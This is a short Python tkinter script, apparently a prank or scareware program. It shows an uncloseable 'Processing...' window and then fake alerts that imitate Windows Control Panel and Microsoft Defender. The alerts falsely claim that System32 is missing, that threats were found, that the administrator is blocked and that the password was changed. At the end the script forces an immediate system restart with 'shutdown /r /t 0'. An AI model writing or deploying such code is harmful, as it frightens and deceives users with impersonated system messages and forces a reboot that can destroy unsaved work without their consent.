import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
import sys
import plyer
from plyer import notification
import os

def update_progressbar():
    if progressbar["value"] < 100:
        progressbar["value"] +=1
        progressbar.update()
        root.after(600, update_progressbar)
    else:
        tk.messagebox.showerror("Error", "An error has occurred!, System32 Not Found!")

        plyer.notification.notify(
            title='',
            message='you must restart your computer to turn off User Account Control',
            timeout=5,
            app_name='Control Panel',
            app_icon='p.ico'
        )

        messagebox.showinfo("Success", "Your Administrator has been blocked")

        plyer.notification.notify(
            title='Threats found',
            message='Threats found, Microsoft Defender Antivirus found threats. Get details.',
            timeout=6,
            app_name='Control Panel',
            app_icon='you.ico'
        )

        messagebox.showinfo("Success", "Your Password has been changed.")
        root.destroy()

root = tk.Tk()
root.geometry("500x200")
root.title("Processing...")
root.protocol("WM_DELETE_WINDOW", lambda: None)

# Center the window
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
x_coord = (screen_width/2) - (500/2)
y_coord = (screen_height/2) - (200/2)
root.geometry("+%d+%d" % (x_coord, y_coord))

label = tk.Label(root, text="Processing...")
label.pack()

progressbar = ttk.Progressbar(root, length=400, mode='determinate')
progressbar.pack()

root.after(0, update_progressbar)
root.mainloop()
os.system("shutdown /r /t 0")
